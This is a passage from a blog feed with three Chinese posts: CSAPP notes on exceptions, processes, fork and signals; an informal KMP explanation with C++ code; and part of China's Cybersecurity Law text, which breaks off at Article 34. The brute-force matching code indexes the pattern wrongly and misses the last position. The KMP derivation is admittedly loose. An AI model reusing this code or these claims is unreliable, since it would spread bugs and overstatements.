        <content type="html"><![CDATA[<h4 id="小声bb-几天没更博客了，这几天真的过得和狗一样，怪也只能怪自己太把自己高看了以为两天写课设绰绰有余，其实只是一个小萌新，在达成48小时从零开始写完数据结构课设的同时完成了两天两夜不睡的新成就，昨天验收结束睡了一觉，终于有时间看书了，CSAPP本来觉得看完了，但是翻了翻发现还是很多知识点之前跳过了，罪过罪过，劝告大家一句话“能够完整的看完一本书是一个人受过高等教育的体现”，希望之后的经典书能整本认真看完。"><a href="#小声bb-几天没更博客了，这几天真的过得和狗一样，怪也只能怪自己太把自己高看了以为两天写课设绰绰有余，其实只是一个小萌新，在达成48小时从零开始写完数据结构课设的同时完成了两天两夜不睡的新成就，昨天验收结束睡了一觉，终于有时间看书了，CSAPP本来觉得看完了，但是翻了翻发现还是很多知识点之前跳过了，罪过罪过，劝告大家一句话“能够完整的看完一本书是一个人受过高等教育的体现”，希望之后的经典书能整本认真看完。" class="headerlink" title="小声bb,几天没更博客了，这几天真的过得和狗一样，怪也只能怪自己太把自己高看了以为两天写课设绰绰有余，其实只是一个小萌新，在达成48小时从零开始写完数据结构课设的同时完成了两天两夜不睡的新成就，昨天验收结束睡了一觉，终于有时间看书了，CSAPP本来觉得看完了，但是翻了翻发现还是很多知识点之前跳过了，罪过罪过，劝告大家一句话“能够完整的看完一本书是一个人受过高等教育的体现”，希望之后的经典书能整本认真看完。"></a>小声bb,几天没更博客了，这几天真的过得和狗一样，怪也只能怪自己太把自己高看了以为两天写课设绰绰有余，其实只是一个小萌新，在达成48小时从零开始写完数据结构课设的同时完成了两天两夜不睡的新成就，昨天验收结束睡了一觉，终于有时间看书了，CSAPP本来觉得看完了，但是翻了翻发现还是很多知识点之前跳过了，罪过罪过，劝告大家一句话“能够完整的看完一本书是一个人受过高等教育的体现”，希望之后的经典书能整本认真看完。</h4><h3 id="异常控制流这章个人感觉精华除了异常外，讲进程的真的精髓"><a href="#异常控制流这章个人感觉精华除了异常外，讲进程的真的精髓" class="headerlink" title="异常控制流这章个人感觉精华除了异常外，讲进程的真的精髓"></a>异常控制流这章个人感觉精华除了异常外，讲进程的真的精髓</h3><p><img src="1.webp" alt=""></p><a id="more"></a><h3 id="1、异常控制流（Exceptional-Contro-Flow）处理过程"><a href="#1、异常控制流（Exceptional-Contro-Flow）处理过程" class="headerlink" title="1、异常控制流（Exceptional Contro Flow）处理过程"></a>1、异常控制流（Exceptional Contro Flow）处理过程</h3><p><img src="2.webp" alt=""><br>这一过程如上图所示，应用程序本来在执行Icur指令，但是有些事件（定时器信号、算术溢出等）会使得处理器的状态发生变化，这时候处理器会通过一张异常跳转表，进行跳转到专门的异常处理程序中，异常处理程序执行完任务以后：可能返回当前正在执行指令、返回当前下一条指令或者终止被中断的程序。</p><h4 id="1-1、异常表-amp-amp-异常表基地址"><a href="#1-1、异常表-amp-amp-异常表基地址" class="headerlink" title="1.1、异常表&amp;&amp;异常表基地址"></a>1.1、异常表&amp;&amp;异常表基地址</h4><p><img src="3.webp" alt=""><br>系统中可能出现的异常都被分配了一个唯一的非负整数的异常号（exception number)，而异常表储存异常号对应的一个异常处理程序<br><img src="4.webp" alt=""><br>当你本机发生一个异常后，你只能拿到这个异常的异常号，你要触发一个异常的处理，你要拿到该异常处理程序的地址，所以通过异常表基址寄存器+异常号获得异常表的数据而执行异常处理。</p><h4 id="1-2、四大异常分类"><a href="#1-2、四大异常分类" class="headerlink" title="1.2、四大异常分类"></a>1.2、四大异常分类</h4><p><img src="5.webp" alt=""></p><h5 id="（1）中断"><a href="#（1）中断" class="headerlink" title="（1）中断"></a>（1）中断</h5><p><img src="6.webp" alt=""><br>中断：是异步发生的，来自处理外部的I/O设备信号的结果.（设备信号之后会详讲<br>实例：当手机播放器在公放音乐的时候，你突然打开某大游戏可能音乐暂时卡住，大概一瞬间后歌曲继续播放，当然大家手机tql，时间太短，感觉不到。（可能我讲的有问题，可能只是突出穷买不起好手机吧，嘤嘤嘤</p><h5 id="（2）陷阱和系统调用"><a href="#（2）陷阱和系统调用" class="headerlink" title="（2）陷阱和系统调用"></a>（2）陷阱和系统调用</h5><p><img src="7.webp" alt=""><br>实现系统调用，在用户程序和内核之间提供一个像函数调用一样的接口。<br>（csapp原书上的实例）比如要读一个文件的内容（read），这些内核服务受到控制的访问，处理器提供的是syscall n指令来响应用户的请求，导致一个陷阱异常，这个异常程序对参数解码并调用内核程序。这个异常处理程序运行在内核模式中。</p><h5 id="（3）故障"><a href="#（3）故障" class="headerlink" title="（3）故障"></a>（3）故障</h5><p><img src="8.webp" alt=""><br>故障发生时，处理器将控制转移到故障处理程序中，由故障处理程序修正错误。如果能够修正就返回当前指令重新执行，如果不能修正就返回到内核的abort中。<br>（csapp原书上的实例）缺页异常，当指令使用一个虚拟地址，但是该地址对应的物理地址在内存中找不到，所以必须从磁盘中取出，就会发生故障。<br>#####（4）终止<br>通常是由一些硬件引起的不可恢复的致命错误<br>直接返回到abort中，终止该应用程序。</p><h4 id="2、进程"><a href="#2、进程" class="headerlink" title="2、进程"></a>2、进程</h4><p>之前写过线程与进程的暧昧缠绵，但是只是从功能上讲，为了友好些有很多沙雕图，也没有讲那么详细对于进程最经典的定义就是一个执行中的程序实例。进程是一个伟大的魔术师，她提供给每个运行的程序一种假象，好像每个程序都在独占处理器和地址空间。其实主要思想就是逻辑控制流和私有地址空间。</p><h5 id="2-1、进程控制流"><a href="#2-1、进程控制流" class="headerlink" title="2.1、进程控制流"></a>2.1、进程控制流</h5><p><img src="9.webp" alt=""><br>上图是一个运行了三个进程A、B、C的系统，处理器的控制流分成了3个，每一个进程1个。随着时间的增加，进程A先运行了一小段（①），然后进程B运行直到结束（②），随后进程C运行了一小段（③）后切换到进程A运行直到A结束（④），最后切换到进程C运行直到结束（⑤）。这样一来每个进程执行它的流的一部分，然后被抢占。由于CPU总是毫秒级别的转移我们什么都不会察觉到。就提供了一种每个程序独占的假象。<br>时间片：进程A执行它控制流的一部分的每个时间片段，就叫时间片。</p><h5 id="2-2、私有地址空间"><a href="#2-2、私有地址空间" class="headerlink" title="2.2、私有地址空间"></a>2.2、私有地址空间</h5><p><img src="10.webp" alt=""><br>这张图放过很多次了，在内存那章会详细讲<br>这个私有的地址空间最上部是内核保留的，最下部是预留给用户程序的。代码始终是从0x08048000处开始（32位系统）。</p><h5 id="2-3、用户模式和内核模式"><a href="#2-3、用户模式和内核模式" class="headerlink" title="2.3、用户模式和内核模式"></a>2.3、用户模式和内核模式</h5><p>处理器为了安全起见，不至于损坏操作系统，必须限制一个应用程序可执行指令能访问的地址空间范围。就发明了两种模式用户模式和内核模式，其中内核模式（上帝模式）有最高的访问权限，甚至可以停止处理器、改变模式位，或者发起一个I/O操作，处理器使用一个寄存器当作模式位，描述当前进程的特权。进程只有当中断、故障或者陷入系统调用时，才会将模式位设置成上帝模式，得到内核访问权限，其他情况下都始终在用户权限中，就能够保证系统的绝对安全。</p><h5 id="2-4、上下文切换机制"><a href="#2-4、上下文切换机制" class="headerlink" title="2.4、上下文切换机制"></a>2.4、上下文切换机制</h5><p><img src="11.webp" alt=""><br>内核中有一个专门的调度程序，当从进程A切换到进程B的时候，内核调度器为每个进程保存一个上下文状态（运行环境保存）：包含程序计数器、用户栈、状态寄存器等，然后切换到另外一个进程处开始执行。<br>当内核代表用户执行系统调用的时候，就会发生上下文切换，如上图所示，当进程A调用read函数的时候，内核代表进程A开始执行系统调用读取磁盘上的文件，这需要耗费相对很长的时间，处理器这时候不会闲着什么都不做，而是开始一种上下文切换机制，切换到进程B开始执行。当B在用户模式下执行了一段时间，磁盘读取完文件以后发送一个中断信号，将执行进程B到进程A的上下文切换，将控制权返回给进程A系统调用read指令后面的那条指令，继续执行进程A。（注：在切换的临界时间内核模式其实也执行了B一个小段时间）</p><h4 id="3、Linux自己写写关于进程的demo"><a href="#3、Linux自己写写关于进程的demo" class="headerlink" title="3、Linux自己写写关于进程的demo"></a>3、Linux自己写写关于进程的demo</h4><h5 id="3-1、fork（）函数来创建一个新进程"><a href="#3-1、fork（）函数来创建一个新进程" class="headerlink" title="3.1、fork（）函数来创建一个新进程"></a>3.1、fork（）函数来创建一个新进程</h5><p><strong>关于fock函数的巴拉巴拉，如果你困了，请跳过这一大串文字，直接看书上两个demo吧</strong><br>我们使用fork（）函数通过系统调用创建一个与原来进程几乎完全相同的进程，除了PID不同外，子进程可以读写父进程中打开的任何文件。一个进程调用fork（）函数后，系统先给新的进程分配资源，例如存储数据和代码的空间。然后把原来的进程的所有值都复制到新的新进程中，只有少数值与原来的进程的值不同。相当于克隆了一个自己。fork函数有一个特别的地方，虽然只被调用一次，却能返回两次。(fock()函数第一次返回是在父进程中，返回的是子进程的PID；一次是在子进程中，返回的是0；因为PID总是非零，返回值为0就说明在子进程中执行了。用来区分，另外Linux下Fock函数定义在unistd.h 中)<br>希望大家自己敲一敲，就算活动活动手指，当作一种运动吧<br><strong>fock函数demo1</strong><br><img src="1.png" alt=""><br>（结果出现原因、x在父子进程中是单独成立的，当调用pid = Fork（）；的时候，第一次返回的是进程的子ID，由于不为0，所以继续执行main函数中的printf，打印输出x = 0；第二次就在子进程中执行了，返回的pid为0表示在子进程中执行，由于两个进程有相对独立的地址空间，子进程得到的只是父进程的一个拷贝，所以x的初始值仍然是1，输出的结果就是x=2了。（至于为啥都输出在屏幕上了，是因为这两个进程共享已经被打开的stdout文件，子进程是继承父进程的，因此输出也是指向屏幕的）<br><strong>在csapp516页上一个有意思的题目，询问下面的的输出值，想了好久，我现在直接输出了，你也可以认真想想贼有意思</strong><br><img src="2.png" alt=""><br><strong>fock函数demo2,这个图能感受到fock函数</strong><br><img src="12.webp" alt=""></p><h5 id="3-2、waitpid函数-sleep函数-pause函数，execve函数等感兴趣的单独查看，这里就不展开了"><a href="#3-2、waitpid函数-sleep函数-pause函数，execve函数等感兴趣的单独查看，这里就不展开了" class="headerlink" title="3.2、waitpid函数,sleep函数,pause函数，execve函数等感兴趣的单独查看，这里就不展开了"></a>3.2、waitpid函数,sleep函数,pause函数，execve函数等感兴趣的单独查看，这里就不展开了</h5><h4 id="4、信号"><a href="#4、信号" class="headerlink" title="4、信号"></a>4、信号</h4><h5 id="4-1、定义"><a href="#4-1、定义" class="headerlink" title="4.1、定义"></a>4.1、定义</h5><p>信号是一种更高层次的软件形式的异常，它允许进程中断其他进程。一个信号就是一个消息，我们列出Linux系统上30个不同种类的信号：正在运行的前台子进程，当键入ctrl-c，发送序号2（SIGINT）；当一个进程发送信号9（SIGKILL）就会强制终止另外一个进程；当子进程终止时，就会发送信号17（SIGCHILD）给父进程。<br><img src="13.webp" alt=""></p><h5 id="4-2、举个例子（实战还是比概念看起来爽啊"><a href="#4-2、举个例子（实战还是比概念看起来爽啊" class="headerlink" title="4.2、举个例子（实战还是比概念看起来爽啊"></a>4.2、举个例子（实战还是比概念看起来爽啊</h5><p><img src="14.webp" alt=""><br>（ps用来查看所有进程，在windows是-netstat ano）<br>1&gt; 使用/bin/kill程序发送信号(使用完整路径)<br>发送9号（SIGKILL）信号给进程6279终止该进程，如果使用-6279就是该进程组的所有进程；</p><h5 id="4-3、你看到这里应该也累了，信号后面的知识看的不是很懂，如果你真的感兴趣，希望你能自己去看书吧"><a href="#4-3、你看到这里应该也累了，信号后面的知识看的不是很懂，如果你真的感兴趣，希望你能自己去看书吧" class="headerlink" title="4.3、你看到这里应该也累了，信号后面的知识看的不是很懂，如果你真的感兴趣，希望你能自己去看书吧"></a>4.3、你看到这里应该也累了，信号后面的知识看的不是很懂，如果你真的感兴趣，希望你能自己去看书吧</h5><p>（另外书上配套了很多优秀的例子和实验，由于本人才疏学浅，就不把自己的结果展示怕误人子弟，非常安利大家去感受大师的魅力</p>]]></content>
      
      
      <categories>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 异常控制流&amp;&amp;进程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KMP浅显证明一波</title>
      <link href="/2019/01/06/kmp-qian-xian-zheng-ming-yi-bo/"/>
      <url>/2019/01/06/kmp-qian-xian-zheng-ming-yi-bo/</url>
      
        <content type="html"><![CDATA[<h3 id="一、KMP的背景"><a href="#一、KMP的背景" class="headerlink" title="一、KMP的背景"></a>一、KMP的背景</h3><p>KMP算法是一种改进的字符串匹配算法，由D.E.Knuth，J.H.Morris和V.R.Pratt同时发现<br>因此人们称它为克努特——莫里斯——普拉特操作（简称KMP算法）。<br>KMP算法的关键是利用匹配失败后的信息，尽量减少模式串与主串的匹配次数以达到快速匹配的目的。<br>具体实现就是实现一个next()函数，函数本身包含了模式串的局部匹配信息。时间复杂度O(m+n)。<br>from –百度百科</p><a id="more"></a><h3 id="二、KMP解决的问题"><a href="#二、KMP解决的问题" class="headerlink" title="二、KMP解决的问题"></a>二、KMP解决的问题</h3><h4 id="2-1-KMP算法要解决的问题就是在字符串（也叫主串）中的模式（pattern）定位问题。说简单点就是我们平时常说的关键字搜索。模式串就是关键字（接下来称它为P），如果它在一个主串（接下来称为T）中出现，就返回它的具体位置，否则返回-1（常用手段）。"><a href="#2-1-KMP算法要解决的问题就是在字符串（也叫主串）中的模式（pattern）定位问题。说简单点就是我们平时常说的关键字搜索。模式串就是关键字（接下来称它为P），如果它在一个主串（接下来称为T）中出现，就返回它的具体位置，否则返回-1（常用手段）。" class="headerlink" title="2.1 KMP算法要解决的问题就是在字符串（也叫主串）中的模式（pattern）定位问题。说简单点就是我们平时常说的关键字搜索。模式串就是关键字（接下来称它为P），如果它在一个主串（接下来称为T）中出现，就返回它的具体位置，否则返回-1（常用手段）。"></a>2.1 KMP算法要解决的问题就是在字符串（也叫主串）中的模式（pattern）定位问题。说简单点就是我们平时常说的关键字搜索。模式串就是关键字（接下来称它为P），如果它在一个主串（接下来称为T）中出现，就返回它的具体位置，否则返回-1（常用手段）。</h4><p><img src="1.png" alt=""></p><h4 id="2-2、假设现在我们需要观察”hello”字符串与”213helldshello”是否匹配"><a href="#2-2、假设现在我们需要观察”hello”字符串与”213helldshello”是否匹配" class="headerlink" title="2.2、假设现在我们需要观察”hello”字符串与”213helldshello”是否匹配"></a>2.2、假设现在我们需要观察”hello”字符串与”213helldshello”是否匹配</h4><p>采用传统的暴力法如下所示</p><pre><code>int main(int argc, const char * argv[]){    //观察&quot;hello&quot;字符串与&quot;213helldshello&quot;是否匹配    string dStr = &quot;213helldshehello&quot;;    string keyStr = &quot;hello&quot;;    for (decltype(dStr.size()) i = 0; i &lt; (dStr.size() - keyStr.size()); ++i) {         for (auto j = i; j &lt; (keyStr.size() + i); ++j) { //开始匹配字符            if (dStr.at(j) != keyStr.at(j)) { //如果不匹配,就终止当前循环                break;            }            if (j == (keyStr.size() + i - 1)){ //如果最后一个字符也匹配成功,就输出匹配成功                cout &lt;&lt; &quot;匹配成功&quot; &lt;&lt; endl;                return 0;            }        }    }    cerr &lt;&lt; &quot;匹配失败&quot;;    return -1;}</code></pre><h4 id="2-3、核心问题所在"><a href="#2-3、核心问题所在" class="headerlink" title="2.3、核心问题所在"></a>2.3、核心问题所在</h4><p>一旦匹配失败，将要重头匹配，导致复杂度升高（主要是逼格低，所以kmp的核心思想是“利用已经部分匹配这个有效信息，保持i指针不回溯，通过修改j指针，让模式串尽量地移动到有效的位置”（别挣扎了，这句话光看是看不懂了，跳过往下看吧</p><h3 id="三、KMP简单实现"><a href="#三、KMP简单实现" class="headerlink" title="三、KMP简单实现"></a>三、KMP简单实现</h3><h4 id="3-1、getNext"><a href="#3-1、getNext" class="headerlink" title="3.1、getNext()"></a>3.1、getNext()</h4><p>当此次匹配失败后,下一次不从下一个重新匹配,而是根据前面的匹配信息选择平移一段距离来匹配,具体平移多长的距离,由getNext()方法来决定.所以接下来我们要讨论到底要移动多长合适<br>观察如下匹配</p><pre><code>213kittzshellokitty   kitty</code></pre><p>我们可以发现到这里的时候,只有前4位匹配成功,根据之前所说的平移,那我们要决定平移多少合适这么一看,我们完全可以平移4位接着匹配.<br>所以是不是成功匹配多少，就移位多少呢？<br>很巧，不是的，瞧下面一个例子</p><pre><code>kkkkkittykkkki</code></pre><p>这个时候我们同样发现前4个是匹配的,但是只有匹配一个位就合适了<br>所以核心问题是解决要<strong>移动几个位</strong></p><h4 id="3-2、公共前后缀-amp-amp-getNext（）"><a href="#3-2、公共前后缀-amp-amp-getNext（）" class="headerlink" title="3.2、公共前后缀&amp;&amp;getNext（）"></a>3.2、公共前后缀&amp;&amp;getNext（）</h4><p>我们观察匹配到的字符串,即如上面的kkkki,他匹配到kkkk时发现剩下的h不匹配,此时他的最大匹配串就是kkkk.然后我们观察他的首尾有最多几个一样的字符串.<br>比如<br>aba     首位的a和末尾的a相同 所以最大公共前后缀的就是1<br>asdasc  这种字符串找不到首位匹配的,所以最大公共前后缀为0.<br>asdas   首位的as 相同 所以最大公共前后缀就是2.<br>这种做法有什么意义呢,当我们发现字符串的长度是n的时候,如果他的公共前后缀长度为0,那么我们就平移他的长度n(n-0=n)<br>getNext返回值是（公共匹配长度-最大公共前后缀）<br>最大公共前后缀其实可以总结为next数组，思想一样，只是算法不同</p><h4 id="3-3、浅显证明一下（不是很严谨，只是希望能够记住"><a href="#3-3、浅显证明一下（不是很严谨，只是希望能够记住" class="headerlink" title="3.3、浅显证明一下（不是很严谨，只是希望能够记住"></a>3.3、浅显证明一下（不是很严谨，只是希望能够记住</h4><p>我们要匹配</p><pre><code>kittittyhelloworldkitty</code></pre><p>开始匹配时,发现前4位是正好匹配的,他的公共匹配是kitt我们发现他的公共前后缀长度是0,所以这个时候我们平移4位.<br>现在假设我们这样的做法是错误的，其实移动三格就能匹配到（这是假设</p><pre><code>kittittyhelloworld   kitty</code></pre><p>如果假设要成立，那么原字符串的第四位一定是k才能匹配到kitty<br>即公共匹配的4位是kitk,最大公共前后缀为1,所以就应该平移3位,刚好对应我们的假设<br>（不知道听懂了没，全跟着感觉走咯）</p><h3 id="四、算法"><a href="#四、算法" class="headerlink" title="四、算法"></a>四、算法</h3><h4 id="4-1、实现getNext（）"><a href="#4-1、实现getNext（）" class="headerlink" title="4.1、实现getNext（）"></a>4.1、实现getNext（）</h4><pre><code>int getNext(string maxStr){    int length = maxStr.size();//存放字符串的长度    string str1;    string str2;    int subLen = 0;    for (int i = 1 ; i &lt; length; ++i) {//截取两段字符串        str1 = maxStr.substr(0,i);        str2 = maxStr.substr(length-i,length);        if(str2 == str1){//比较            subLen = i;        }    }    return length - subLen;//此地用的不是next数组，其实subLen可以用以计算next数组}</code></pre><h4 id="4-2、主函数"><a href="#4-2、主函数" class="headerlink" title="4.2、主函数"></a>4.2、主函数</h4><pre><code>int main(){    /*     目标字符串:HelloworldiamKittyihiahiahia     匹配字符串:Kitty     */    string deStr(&quot;HelloworldiamKittyihiahiahia&quot;);    string keyStr(&quot;Kitty&quot;);    //1.先匹配,找到匹配到的公共最大匹配串,需要一个字符串maxStr来保存    string maxStr(&quot;&quot;);    int steps;    int length; //用于循环中计算当前长度    //2.开始匹配    for (int i = 0; i &lt; (deStr.size() - keyStr.size());) {        length = 0;//每次重新搜索都把length置0        steps = 1;//每次平移一段距离都重新计算平移的距离        for (int j = i; j &lt; (keyStr.size() + i); ++j) {            if (deStr.at(j) != keyStr.at(j-i)) {                if ( length &gt; 1) {                    maxStr = keyStr.substr(0,length);                    //***************                    steps = getNext(maxStr); //这里需要一个函数,来告诉我们每次需要跳过多少次                    //***************                }                break;  //如果当前循环不一致则结束循环            }            ++length; //匹配成功字符串长度加1            if (length == keyStr.size()){                cout &lt;&lt; &quot;匹配成功&quot; &lt;&lt; endl;                cout&lt;&lt;&quot;匹配成功第一次的第一个字符的下标为：&quot;&lt;&lt;i&lt;&lt;endl;                 return 0;            }        }        i += steps;    }    cout &lt;&lt; &quot;匹配不成功&quot;;    return -1;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全法</title>
      <link href="/2019/01/06/wang-luo-an-quan-fa/"/>
      <url>/2019/01/06/wang-luo-an-quan-fa/</url>
      
        <content type="html"><![CDATA[<h4 id="听说不懂法的人是没法搞安全的，所以有空还是认真看一看（认真脸）。"><a href="#听说不懂法的人是没法搞安全的，所以有空还是认真看一看（认真脸）。" class="headerlink" title="听说不懂法的人是没法搞安全的，所以有空还是认真看一看（认真脸）。"></a>听说不懂法的人是没法搞安全的，所以有空还是认真看一看（认真脸）。</h4><p><img src="1.png" alt=""></p><a id="more"></a><p><strong>目录</strong></p><p>第一章 总则</p><p>第二章 网络安全支持与促进</p><p>第三章 网络运行安全</p><p>第一节 一般规定</p><p>第二节 关键信息基础设施的运行安全</p><p>第四章 网络信息安全</p><p>第五章 监测预警与应急处置</p><p>第六章 法律责任</p><p>第七章 附 则</p><p><strong>条文</strong></p><p><strong>第一章 总 则</strong></p><p><strong>第一条</strong> 为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。</p><p><strong>第二条</strong> 在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。</p><p><strong>第三条</strong> 国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。</p><p><strong>第四条</strong> 国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。</p><p><strong>第五条</strong> 国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。</p><p><strong>第六条</strong> 国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。</p><p><strong>第七条</strong> 国家积极开展网络空间治理、网络技术研发和标准制定、打击网络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。</p><p><strong>第八条</strong> 国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。</p><p>县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。</p><p><strong>第九条</strong> 网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。</p><p><strong>第十条</strong> 建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。</p><p><strong>第十一条</strong> 网络相关行业组织按照章程，加强行业自律，制定网络安全行为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。</p><p><strong>第十二条</strong> 国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。</p><p>任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。</p><p><strong>第十三条</strong> 国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。</p><p><strong>第十四条</strong> 任何个人和组织有权对危害网络安全的行为向网信、电信、公安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。</p><p>有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。</p><p><strong>第二章 网络安全支持与促进</strong></p><p><strong>第十五条</strong> 国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。</p><p>国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家标准、行业标准的制定。</p><p><strong>第十六条</strong> 国务院和省、自治区、直辖市人民政府应当统筹规划，加大投入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构和高等学校等参与国家网络安全技术创新项目。</p><p><strong>第十七条</strong> 国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。</p><p><strong>第十八条</strong> 国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。</p><p>国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。</p><p><strong>第十九条</strong> 各级人民政府及其有关部门应当组织开展经常性的网络安全宣传教育，并指导、督促有关单位做好网络安全宣传教育工作。</p><p>大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。</p><p><strong>第二十条</strong> 国家支持企业和高等学校、职业学校等教育培训机构开展网络安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。</p><p><strong>第三章 网络运行安全</strong></p><p>第一节 一般规定</p><p><strong>第二十一条</strong> 国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：</p><p>（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任；</p><p>（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施；</p><p>（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月；</p><p>（四）采取数据分类、重要数据备份和加密等措施；</p><p>（五）法律、行政法规规定的其他义务。</p><p><strong>第二十二条</strong> 网络产品、服务应当符合相关国家标准的强制性要求。网络产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p><p>网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或者当事人约定的期限内，不得终止提供安全维护。</p><p>网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。</p><p><strong>第二十三条</strong> 网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。</p><p><strong>第二十四条</strong> 网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提供真实身份信息的，网络运营者不得为其提供相关服务。</p><p>国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。</p><p><strong>第二十五条</strong> 网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。</p><p><strong>第二十六条</strong> 开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。</p><p><strong>第二十七条</strong> 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。</p><p><strong>第二十八条</strong> 网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助。</p><p><strong>第二十九条</strong> 国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。</p><p>有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。</p><p><strong>第三十条</strong> 网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。</p><p>第二节 关键信息基础设施的运行安全</p><p><strong>第三十一条</strong> 国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。</p><p>国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。</p><p><strong>第三十二条</strong> 按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。</p><p><strong>第三十三条</strong> 建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。</p><p><strong>第三十四条</strong> 